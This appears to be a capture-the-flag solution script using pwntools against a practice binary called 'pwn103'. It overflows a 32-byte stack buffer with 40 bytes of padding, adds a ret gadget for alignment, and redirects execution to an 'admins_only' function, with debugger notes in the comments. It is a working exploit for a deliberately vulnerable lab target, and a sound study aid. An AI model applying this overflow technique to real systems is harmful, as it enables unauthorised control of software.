import pwn

# p = pwn.remote('10.10.25.91','9003')
# pwn.context.log_level = 'debug'
# p.recv()
#
# # Padding
# # Dump of assembler code for function general:
# #    0x00000000004012be <+0>:     push   rbp
# #    0x00000000004012bf <+1>:     mov    rbp,rsp
# #    0x00000000004012c2 <+4>:     sub    rsp,0x20 // Hex To Dec 32
# # Decompile Version
# # char local_28 [32];
#
# 0x00401377

pwn.context.binary = binary = pwn.ELF("pwn103.pwn103")
p = pwn.process()
p.sendlineafter(b': ',b'3')

payload = pwn.flat(
    # We know 40 using cyclic
    # *RBP  0x6161616161616165 ('eaaaaaaa')
    # *RSP  0x7fffffffd9f8 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
    # *RIP  0x401377 (general+185) ◂— ret
    # -----
    # pwndbg> cyclic -l faaaaaaa
    #  Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
    #  Found at offset 40
    b"A"*40, 

    # Because of ubunmtu 16 we need suply ret gadget before putting functions admins_only address of a 'ret' instruction - needed for stack alignment
    # objdump -d pwn103.pwn103 | grep ret
    # 401016:       c3                      ret
    0x401016,

    # pwndbg> x admins_only
    # 0x401554 <admins_only>: 0xe5894855
    0x401554,
)

p.sendlineafter(b'[pwner]: ',payload)
p.interactive()
